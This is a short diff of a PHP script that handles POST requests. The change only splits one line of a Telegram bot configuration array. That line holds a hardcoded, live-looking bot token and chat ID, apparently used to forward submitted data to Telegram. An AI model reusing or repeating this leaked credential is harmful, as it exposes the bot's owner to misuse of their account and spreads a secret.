@@ -8,7 +8,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     // Telegram Bot Configurations - MULTIPLE SUPPORTED
     $telegramBots = [
-        ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+        ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 
+        'chat_id' => '1325797388'],
         // Add more bots here if needed
     ];
 
